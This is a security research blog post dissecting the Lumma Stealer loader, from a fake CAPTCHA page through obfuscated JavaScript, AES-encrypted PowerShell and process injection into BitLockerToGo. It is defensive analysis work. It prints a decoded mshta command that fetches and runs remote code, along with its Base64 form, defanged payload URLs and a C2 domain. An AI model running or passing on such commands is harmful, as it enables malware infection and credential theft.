<!DOCTYPE html>
<html lang="en" class="auto-color">
<head>

    <title>Dissecting Lumma Malware: Analyzing the Fake CAPTCHA and Obfuscation Techniques - Part 2</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=c619e7c725" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=c619e7c725" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=c619e7c725" />

    <meta name="description" content="Detailed analysis of the Lumma Stealer malware in Part 2 of our series. Detect malicious activities, and uncover process injections using tools like CyberChef, DIE, and Hollows Hunter.">
    <link rel="icon" href="https://denwp.com/content/images/size/w256h256/2024/04/Screenshot_2024-04-17_at_23-12-42_Logo_Maker_Used_By_2.3_Million_Startups-removebg-preview-1.png" type="image/png">
    <link rel="canonical" href="https://denwp.com/dissecting-lumma-malware/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Denwp Research">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Dissecting Lumma Malware: Analyzing the Fake CAPTCHA and Obfuscation Techniques - Part 2">
    <meta property="og:description" content="Detailed analysis of the Lumma Stealer malware in Part 2 of our series. Detect malicious activities, and uncover process injections using tools like CyberChef, DIE, and Hollows Hunter.">
    <meta property="og:url" content="https://denwp.com/dissecting-lumma-malware/">
    <meta property="og:image" content="https://denwp.com/content/images/2024/09/5.gif">
    <meta property="article:published_time" content="2024-09-08T14:03:37.000Z">
    <meta property="article:modified_time" content="2024-11-01T10:56:16.000Z">
    <meta property="article:tag" content="blog">
    <meta property="article:tag" content="Malware">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Dissecting Lumma Malware: Analyzing the Fake CAPTCHA and Obfuscation Techniques - Part 2">
    <meta name="twitter:description" content="Detailed analysis of the Lumma Stealer malware in Part 2 of our series. Detect malicious activities, and uncover process injections using tools like CyberChef, DIE, and Hollows Hunter.">
    <meta name="twitter:url" content="https://denwp.com/dissecting-lumma-malware/">
    <meta name="twitter:image" content="https://denwp.com/content/images/2024/09/5.gif">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Tonmoy Jitu">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="blog, Malware">
    <meta name="twitter:site" content="@tonmoy0010">
    <meta name="twitter:creator" content="@tonmoy0010">
    <meta property="og:image:width" content="480">
    <meta property="og:image:height" content="480">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Denwp Research",
        "url": "https://denwp.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://denwp.com/content/images/size/w256h256/2024/04/Screenshot_2024-04-17_at_23-12-42_Logo_Maker_Used_By_2.3_Million_Startups-removebg-preview-1.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Tonmoy Jitu",
        "url": "https://denwp.com/author/tonmoy/",
        "sameAs": [
            "https://twitter.com/tonmoy0010"
        ]
    },
    "headline": "Dissecting Lumma Malware: Analyzing the Fake CAPTCHA and Obfuscation Techniques - Part 2",
    "url": "https://denwp.com/dissecting-lumma-malware/",
    "datePublished": "2024-09-08T14:03:37.000Z",
    "dateModified": "2024-11-01T10:56:16.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://denwp.com/content/images/2024/09/5.gif",
        "width": 480,
        "height": 480
    },
    "keywords": "blog, Malware",
    "description": "In Part 1 of our series on Lumma Stealer, we explored the initial attack vector through a fake CAPTCHA page. We observed how the malware deceives users into downloading and executing malicious payloads. In this second series, we delve deeper into the technical details of the Lumma Stealerâ€™s loader, focusing on its obfuscation techniques and how it ultimately executes its payload. This analysis will cover how we decode obfuscated JavaScript and PowerShell code, and how we identify and analyze the",
    "mainEntityOfPage": "https://denwp.com/dissecting-lumma-malware/"
}
    </script>

    <meta name="generator" content="Ghost 5.101">
    <link rel="alternate" type="application/rss+xml" title="Denwp Research" href="https://denwp.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="6587b765c4efe9695d442b714c" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="https://denwp.com/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="https://denwp.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=c619e7c725"></script><style>:root {--ghost-accent-color: #691a5d;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=c619e7c725">
    <style>
    .article-image {
        max-width: 500px;
        margin: 0 auto !important;
        float: none !important;
	}
</style>

</head>
<body class="post-template tag-blog tag-malware is-head-left-logo">
<div class="viewport">

    <header id="gh-head" class="gh-head outer is-header-hidden">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://denwp.com">
                        Denwp Research
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger" aria-label="Main Menu"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://denwp.com/">Home</a></li>
    <li class="nav-malware"><a href="https://denwp.com/tag/malware/">Malware</a></li>
    <li class="nav-detection-engineering"><a href="https://denwp.com/tag/detection-engineering/">Detection Engineering</a></li>
    <li class="nav-about"><a href="https://denwp.com/about/">About</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-blog tag-malware image-full">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/blog/">blog</a>
                </span>
        </div>

        <h1 class="article-title">Dissecting Lumma Malware: Analyzing the Fake CAPTCHA and Obfuscation Techniques - Part 2</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list instapaper_ignore">
                <li class="author-list-item">
                    <a href="/author/tonmoy/" class="author-avatar author-profile-image" aria-label="Read more of Tonmoy Jitu"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/tonmoy/">Tonmoy Jitu</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2024-09-09">Sep 9, 2024</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 10 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    srcset="/content/images/size/w300/2024/09/5.gif 300w,
                            /content/images/size/w600/2024/09/5.gif 600w,
                            /content/images/size/w1000/2024/09/5.gif 1000w,
                            /content/images/size/w2000/2024/09/5.gif 2000w"
                    sizes="(min-width: 1400px) 1400px, 92vw"
                    src="/content/images/size/w2000/2024/09/5.gif"
                    alt="Dissecting Lumma Malware: Analyzing the Fake CAPTCHA and Obfuscation Techniques - Part 2"
                />
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <p>In <a href="https://denwp.com/anatomy-of-a-lumma-stealer/" rel="noreferrer">Part 1</a> of our series on Lumma Stealer, we explored the initial attack vector through a fake CAPTCHA page. We observed how the malware deceives users into downloading and executing malicious payloads. In this second series, we delve deeper into the technical details of the Lumma Stealerâ€™s loader, focusing on its obfuscation techniques and how it ultimately executes its payload. This analysis will cover how we decode obfuscated JavaScript and PowerShell code, and how we identify and analyze the malicious activities carried out by the malware.</p><h2 id="retrieving-and-analyzing-the-lumma-loader">Retrieving and Analyzing the Lumma Loader</h2><p>After the initial infection is established through the fake CAPTCHA page, we analyze the Lumma Stealer loader. The loader is delivered via the following URL:</p><pre><code>hxxps[:]//human-check.b-cdn[.]net/verify-captcha-v7[.]html</code></pre><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image.png" class="kg-image" alt="" loading="lazy" width="1060" height="865" srcset="https://denwp.com/content/images/size/w600/2024/09/image.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image.png 1000w, https://denwp.com/content/images/2024/09/image.png 1060w" sizes="(min-width: 720px) 720px"></figure><p>By analyzing the payload retrieved through <code>mshta</code>, we start by decoding an encoded Base64 string using CyberChef:</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-1.png" class="kg-image" alt="" loading="lazy" width="776" height="501" srcset="https://denwp.com/content/images/size/w600/2024/09/image-1.png 600w, https://denwp.com/content/images/2024/09/image-1.png 776w" sizes="(min-width: 720px) 720px"></figure><p><u>Encoded Bas64 String:</u></p><pre><code>bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AcABvAGsAbwAuAGIALQBjAGQAbgAuAG4AZQB0AC8AcABvAGsAbwAiAA==</code></pre><p><u>Decoded Base64 string:</u></p><pre><code>mshta "hxxps[://]poko[.]b-cdn[.]net/poko""</code></pre><h2 id="examining-the-poko-file">Examining the 'poko' File</h2><p>The <code>poko</code> file downloaded from the URL is analyzed using Detect It Easy (DIE) to identify its properties:</p><ul><li><strong>File Type</strong>: PE file</li><li><strong>Packer</strong>: No signs of packing detected</li></ul><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-2.png" class="kg-image" alt="" loading="lazy" width="844" height="67" srcset="https://denwp.com/content/images/size/w600/2024/09/image-2.png 600w, https://denwp.com/content/images/2024/09/image-2.png 844w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-3.png" class="kg-image" alt="" loading="lazy" width="843" height="619" srcset="https://denwp.com/content/images/size/w600/2024/09/image-3.png 600w, https://denwp.com/content/images/2024/09/image-3.png 843w" sizes="(min-width: 720px) 720px"></figure><p>The file, detected as a PE (Portable Executable) file, shows no signs of packing. Since <code>mshta</code> processes HTA (HTML Application) files, we suspect that the downloaded binary may contain embedded JavaScript (JS) or VBScript. We search the binary for <code>&lt;script&gt;</code> tags using DIEâ€™s Advanced mode:</p><blockquote>Navigate to <strong>Resources</strong> in DIE &gt; Filter for <code>&lt;script&gt;</code> tags</blockquote><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-4.png" class="kg-image" alt="" loading="lazy" width="1137" height="750" srcset="https://denwp.com/content/images/size/w600/2024/09/image-4.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-4.png 1000w, https://denwp.com/content/images/2024/09/image-4.png 1137w" sizes="(min-width: 720px) 720px"></figure><p>By filtering for <code>&lt;script&gt;</code> tags, we locate two sets of these tags. In the Resources tab, use the search functionality to find these <code>&lt;script&gt;</code> tags, which signal the presence of JavaScript code embedded within the binary.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-5.png" class="kg-image" alt="" loading="lazy" width="1237" height="583" srcset="https://denwp.com/content/images/size/w600/2024/09/image-5.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-5.png 1000w, https://denwp.com/content/images/2024/09/image-5.png 1237w" sizes="(min-width: 720px) 720px"></figure><h2 id="dumping-javascript">Dumping JavaScript</h2><p>There are three ways we can dump the embedded JS data.</p><h3 id="using-detect-it-easy">Using Detect It Easy </h3><p>To extract embedded JavaScript, we follow these steps in DIE. Right-clicking on a script tag and selecting "Follow in &gt; Hex" shows us the hex and ASCII representation of the code, confirming that itâ€™s JavaScript.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-6.png" class="kg-image" alt="" loading="lazy" width="1235" height="466" srcset="https://denwp.com/content/images/size/w600/2024/09/image-6.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-6.png 1000w, https://denwp.com/content/images/2024/09/image-6.png 1235w" sizes="(min-width: 720px) 720px"></figure><p>Looking at the right panel, we see some code inside. After analyzing the first script tag, we use the same approach for the second script tag found under 'strings'.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-7.png" class="kg-image" alt="" loading="lazy" width="1236" height="538" srcset="https://denwp.com/content/images/size/w600/2024/09/image-7.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-7.png 1000w, https://denwp.com/content/images/2024/09/image-7.png 1236w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-8.png" class="kg-image" alt="" loading="lazy" width="1227" height="548" srcset="https://denwp.com/content/images/size/w600/2024/09/image-8.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-8.png 1000w, https://denwp.com/content/images/2024/09/image-8.png 1227w" sizes="(min-width: 720px) 720px"></figure><p>From the ASCII symbols, we can see that the script code is closing windows. Now that we have both sections, we can select all the hex values between the opening and closing script tags, copy them, and save them to a file. This will give us the JavaScript code. </p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-9.png" class="kg-image" alt="" loading="lazy" width="1229" height="521" srcset="https://denwp.com/content/images/size/w600/2024/09/image-9.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-9.png 1000w, https://denwp.com/content/images/2024/09/image-9.png 1229w" sizes="(min-width: 720px) 720px"></figure><h3 id="using-hexedit"><strong>Using HexedIT</strong></h3><p>HexedIT provides an intuitive graphical interface for extracting JavaScript. We open the binary in HexedIT and search for <code>&lt;script&gt;</code> tags with <code>Ctrl + F</code>. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://denwp.com/content/images/2024/09/image-10.png" class="kg-image" alt="" loading="lazy" width="1099" height="726" srcset="https://denwp.com/content/images/size/w600/2024/09/image-10.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-10.png 1000w, https://denwp.com/content/images/2024/09/image-10.png 1099w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">&gt;</span></figcaption></figure><p>We then select the data between these tags and save it to a new file.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-11.png" class="kg-image" alt="" loading="lazy" width="403" height="363"></figure><h3 id="using-a-custom-python-script"><strong>Using a Custom Python Script</strong></h3><p>We can also use a custom Python script to automate the extraction of JavaScript from the binary. The script reads the binary, searches for <code>&lt;script&gt;</code> tags, and extracts the code between them. Here is a glimpse of the extracted code.</p><p>The first script tag contains code that assigns random numbers to different variables.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-14.png" class="kg-image" alt="" loading="lazy" width="1095" height="230" srcset="https://denwp.com/content/images/size/w600/2024/09/image-14.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-14.png 1000w, https://denwp.com/content/images/2024/09/image-14.png 1095w" sizes="(min-width: 720px) 720px"></figure><p>The second script utilizes the <code>eval</code> function to execute obfuscated code, which includes a <code>window.close()</code> function.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-15.png" class="kg-image" alt="" loading="lazy" width="397" height="116"></figure><p>The following example Python script illustrates how this can be accomplished:</p><pre><code class="language-python">import sys
import re

def extract_scripts(binary_file):
    try:
        with open(binary_file, "rb") as f:
            binary_data = f.read()
        
        # Convert binary data to string (Assuming it's encoded in utf-8 or similar encoding)
        try:
            data = binary_data.decode("utf-8", errors='ignore')
        except UnicodeDecodeError:
            print("[-] Failed to decode binary data.")
            sys.exit(1)
        
        # Find all the script tag contents using regex
        scripts = re.findall(r'&lt;script.*?&gt;(.*?)&lt;/script&gt;', data, re.DOTALL | re.IGNORECASE)
        
        if scripts:
            for i, script in enumerate(scripts, start=1):
                print(f"[+] Script {i}\n{script.strip()}\n")
        else:
            print("[-] No Script found.")
    
    except FileNotFoundError:
        print(f"[-] File {binary_file} not found.")
    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python extract.py &lt;binary_file&gt;")
        sys.exit(1)
    
    binary_file = sys.argv[1]
    extract_scripts(binary_file)
</code></pre><h2 id="debugging-the-javascript">Debugging the JavaScript</h2><p>With the JavaScript code dumped, we now focus on deciphering the obfuscation.</p><h3 id="first-obfuscation">First obfuscation</h3><p>We can beautify the JavaScript code using an online formatter or CyberChef (Generic Code Beautify). This reveals the obfuscated sections more clearly, showing random variable assignments and functions.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-12.png" class="kg-image" alt="" loading="lazy" width="1636" height="342" srcset="https://denwp.com/content/images/size/w600/2024/09/image-12.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-12.png 1000w, https://denwp.com/content/images/size/w1600/2024/09/image-12.png 1600w, https://denwp.com/content/images/2024/09/image-12.png 1636w" sizes="(min-width: 720px) 720px"></figure><p>After beautifying the code, we observe numerous numbers being assigned to various variables. Further down, we find a variable named <code>PHF</code>. This indicates that <code>PHF</code> holds the code passed to the second script via the <code>eval</code> function. </p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-13.png" class="kg-image" alt="" loading="lazy" width="1627" height="319" srcset="https://denwp.com/content/images/size/w600/2024/09/image-13.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-13.png 1000w, https://denwp.com/content/images/size/w1600/2024/09/image-13.png 1600w, https://denwp.com/content/images/2024/09/image-13.png 1627w" sizes="(min-width: 720px) 720px"></figure><p>Using <code>console.log()</code>, we print the <code>PHF</code> variable to view another layer of obfuscation.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-16.png" class="kg-image" alt="" loading="lazy" width="1348" height="595" srcset="https://denwp.com/content/images/size/w600/2024/09/image-16.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-16.png 1000w, https://denwp.com/content/images/2024/09/image-16.png 1348w" sizes="(min-width: 720px) 720px"></figure><h3 id="second-obfuscation">Second Obfuscation</h3><p>Beautification of the next layer of code reveals that the <code>zsi</code> function processes an array of numbers by converting them into characters, which are then concatenated into a string.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-17.png" class="kg-image" alt="" loading="lazy" width="748" height="282" srcset="https://denwp.com/content/images/size/w600/2024/09/image-17.png 600w, https://denwp.com/content/images/2024/09/image-17.png 748w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-18.png" class="kg-image" alt="" loading="lazy" width="765" height="126" srcset="https://denwp.com/content/images/size/w600/2024/09/image-18.png 600w, https://denwp.com/content/images/2024/09/image-18.png 765w" sizes="(min-width: 720px) 720px"></figure><p>We pass the final variables, <code>Hkb</code> and <code>ZhX</code> to <code>console.log()</code> to see the decoded data.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-20.png" class="kg-image" alt="" loading="lazy" width="1333" height="297" srcset="https://denwp.com/content/images/size/w600/2024/09/image-20.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-20.png 1000w, https://denwp.com/content/images/2024/09/image-20.png 1333w" sizes="(min-width: 720px) 720px"></figure><h3 id="third-obfuscation">Third obfuscation</h3><p>After obtaining the data, we see that it includes encoded PowerShell code. This PowerShell script processes several values that appear to be hex data and uses <code>wscript</code> to execute them.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-22.png" class="kg-image" alt="" loading="lazy" width="1560" height="463" srcset="https://denwp.com/content/images/size/w600/2024/09/image-22.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-22.png 1000w, https://denwp.com/content/images/2024/09/image-22.png 1560w" sizes="(min-width: 720px) 720px"></figure><p>The code also shows that it uses AES encryption, with the decryption key hardcoded into it.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-24.png" class="kg-image" alt="" loading="lazy" width="1466" height="347" srcset="https://denwp.com/content/images/size/w600/2024/09/image-24.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-24.png 1000w, https://denwp.com/content/images/2024/09/image-24.png 1466w" sizes="(min-width: 720px) 720px"></figure><h2 id="decrypting-obfuscated-code-using-cyberchef">Decrypting obfuscated code using CyberChef</h2><p>With the main code and the AES decryption key in hand, we can use CyberChef to decrypt it. We input the key as hex into CyberChef and set the initialization vector (IV) value to "0000000000000000" (sixteen zeros). If no IV is provided, it defaults to null.</p><p>The IV value is set to sixteen zeros because the AES encryption algorithm requires an IV of a specific length to ensure secure encryption and decryption. For AES, the IV must match the block size of the algorithm, which is 128 bits or 16 bytes (16 zeros in hexadecimal representation).</p><p>Using a fixed IV, such as sixteen zeros, is common in certain situations, especially when the IV is not dynamically generated or when the encryption is designed to be simple or demonstrative. However, in secure practices, it's crucial to use a unique and random IV for each encryption operation to prevent predictable patterns and enhance security. In this context, the fixed IV is used because it was hardcoded into the decryption process, which may simplify the analysis but does not represent best practices for secure encryption.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-25.png" class="kg-image" alt="" loading="lazy" width="1265" height="853" srcset="https://denwp.com/content/images/size/w600/2024/09/image-25.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-25.png 1000w, https://denwp.com/content/images/2024/09/image-25.png 1265w" sizes="(min-width: 720px) 720px"></figure><p>From the CyberChef output, we obtain another PowerShell script. After beautifying the code, we can decipher its functionality. It begins with a function that handles binary data. The <code>EkF</code> function extracts the zip file and saves it to the temp directory. The <code>QyY</code> function obfuscates the URL by hiding characters behind numbers, and it contains the URL for downloading the zip file. The <code>nzv</code> function deobfuscates these numbers into a string. Finally, the <code>YWy</code> function manages error handling with if/else statements, checking if the file exists and downloading the zip file if it does not.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-26.png" class="kg-image" alt="" loading="lazy" width="1496" height="789" srcset="https://denwp.com/content/images/size/w600/2024/09/image-26.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-26.png 1000w, https://denwp.com/content/images/2024/09/image-26.png 1496w" sizes="(min-width: 720px) 720px"></figure><h3 id="de-obfuscating-powershell-code">De-obfuscating PowerShell code</h3><p>Since the code is in PowerShell, we can use the <code>write-output</code> function to read the values stored in the variables. We copy the <code>nzv</code> function, which handles the decryption of characters, and save the results to separate variables. Running the code reveals a URL, and we also see that it uses the native Windows <code>Net.WebClient</code> to download the file.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-38.png" class="kg-image" alt="" loading="lazy" width="1014" height="764" srcset="https://denwp.com/content/images/size/w600/2024/09/image-38.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-38.png 1000w, https://denwp.com/content/images/2024/09/image-38.png 1014w" sizes="(min-width: 720px) 720px"></figure><h2 id="downloaded-zip-file">Downloaded zip file </h2><p>We proceed by downloading and unzipping the file. Upon examining its contents, we find that it attempts to impersonate "Aeon Timeline."</p><pre><code>hxxps[://]poko[.]b-cdn[.]net/wifi[.]zip</code></pre><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-28.png" class="kg-image" alt="" loading="lazy" width="790" height="268" srcset="https://denwp.com/content/images/size/w600/2024/09/image-28.png 600w, https://denwp.com/content/images/2024/09/image-28.png 790w" sizes="(min-width: 720px) 720px"></figure><p>By performing static analysis with PEStudio, we gather more information about the file. The version details indicate that the installer is masquerading as a PC Cleaner application.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-29.png" class="kg-image" alt="" loading="lazy" width="1150" height="619" srcset="https://denwp.com/content/images/size/w600/2024/09/image-29.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-29.png 1000w, https://denwp.com/content/images/2024/09/image-29.png 1150w" sizes="(min-width: 720px) 720px"></figure><p>Using DIE, we also confirm that the application has been compiled with Go Language.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-30.png" class="kg-image" alt="" loading="lazy" width="886" height="649" srcset="https://denwp.com/content/images/size/w600/2024/09/image-30.png 600w, https://denwp.com/content/images/2024/09/image-30.png 886w" sizes="(min-width: 720px) 720px"></figure><h2 id="dynamic-analysis">Dynamic analysis</h2><p>After obtaining the binary, we proceed with dynamic analysis and find that the installer triggers BitLockerToGo upon installation. </p><p>Our earlier WireShark logs (<a href="https://denwp.com/anatomy-of-a-lumma-stealer/" rel="noreferrer">Part 1</a>) show that BitLockerToGo communicates with the C2 server once it starts. Confirming this behavior, we deduce that the malicious PE file (Aeon Timeline) performs process injection, injecting malicious processes into BitLockerToGo.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-36.png" class="kg-image" alt="" loading="lazy" width="371" height="64"></figure><h3 id="dumping-injected-process">Dumping injected process</h3><p>To dump the malicious process, we use "<a href="https://github.com/hasherezade/hollows_hunter?ref=denwp.com" rel="noreferrer">Hollows Hunter</a>." </p><p>Hollows Hunter is a powerful tool used for detecting and analyzing process injection techniques in Windows environments. It specializes in identifying processes that have been injected with malicious code or exhibit suspicious behavior. By scanning running processes, Hollows Hunter can pinpoint injected code and dump it for further analysis. This tool is particularly valuable for uncovering sophisticated malware that hides its presence by injecting into legitimate processes. It provides security analysts with critical insights into malicious activities, helping them to understand and mitigate threats more effectively.</p><p>We first use Process Explorer to identify the Process ID (PID) of BitLockerToGo and pass it as a parameter to Hollows Hunter. The tool then detects the suspicious process and dumps the file.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-31.png" class="kg-image" alt="" loading="lazy" width="1017" height="348" srcset="https://denwp.com/content/images/size/w600/2024/09/image-31.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-31.png 1000w, https://denwp.com/content/images/2024/09/image-31.png 1017w" sizes="(min-width: 720px) 720px"></figure><h2 id="lumma-c2">Lumma C2</h2><p>After dumping the file, we upload it to VirusTotal, where it is confirmed as Lumma Stealer.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-37.png" class="kg-image" alt="" loading="lazy" width="1299" height="199" srcset="https://denwp.com/content/images/size/w600/2024/09/image-37.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-37.png 1000w, https://denwp.com/content/images/2024/09/image-37.png 1299w" sizes="(min-width: 720px) 720px"></figure><p>Analyzing the file dumped by Hollows Hunter in DIE reveals that it is a Microsoft Linker file, with no signs of any packer being used.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-32.png" class="kg-image" alt="" loading="lazy" width="877" height="646" srcset="https://denwp.com/content/images/size/w600/2024/09/image-32.png 600w, https://denwp.com/content/images/2024/09/image-32.png 877w" sizes="(min-width: 720px) 720px"></figure><p>As is customary with binary analysis, we search for hardcoded domains within the file. Noting that Lumma Stealer has recently been associated with '.shop.' domains, we use this as a filter and find a match.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-33.png" class="kg-image" alt="" loading="lazy" width="924" height="243" srcset="https://denwp.com/content/images/size/w600/2024/09/image-33.png 600w, https://denwp.com/content/images/2024/09/image-33.png 924w" sizes="(min-width: 720px) 720px"></figure><pre><code>futureddospzmvq[.]shop</code></pre><p>We can also use Ghidra's search function to pinpoint the exact function that calls the C2 domain.</p><figure class="kg-card kg-image-card"><img src="https://denwp.com/content/images/2024/09/image-35.png" class="kg-image" alt="" loading="lazy" width="1135" height="207" srcset="https://denwp.com/content/images/size/w600/2024/09/image-35.png 600w, https://denwp.com/content/images/size/w1000/2024/09/image-35.png 1000w, https://denwp.com/content/images/2024/09/image-35.png 1135w" sizes="(min-width: 720px) 720px"></figure><h2 id="summary">Summary</h2><p>In this analysis, we thoroughly examined the Lumma Stealer malware's loader and payload, uncovering its intricate obfuscation techniques and malicious activities. By dissecting the initial infection vector through a fake CAPTCHA page and following the trail to the embedded PowerShell scripts, we detailed the steps involved in decoding the obfuscated code and understanding its functionality. Our dynamic analysis revealed that the malware, masquerading as a legitimate application, performs process injection to carry out its malicious operations.</p><p>Through tools like CyberChef, DIE, and Ghidra, we were able to decrypt, analyze, and identify the core components of the Lumma Stealer. Our findings confirm its operation and provide insights into its behavior and persistence mechanisms. This comprehensive investigation highlights the sophistication of modern malware and underscores the importance of detailed analysis to uncover and understand these threats.</p><div class="kg-card kg-toggle-card" data-kg-toggle-state="close">
            <div class="kg-toggle-heading">
                <h4 class="kg-toggle-heading-text"><span style="white-space: pre-wrap;">IOC</span></h4>
                <button class="kg-toggle-card-icon" aria-label="Expand toggle to read content">
                    <svg id="Regular" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path class="cls-1" d="M23.25,7.311,12.53,18.03a.749.749,0,0,1-1.06,0L.75,7.311"></path>
                    </svg>
                </button>
            </div>
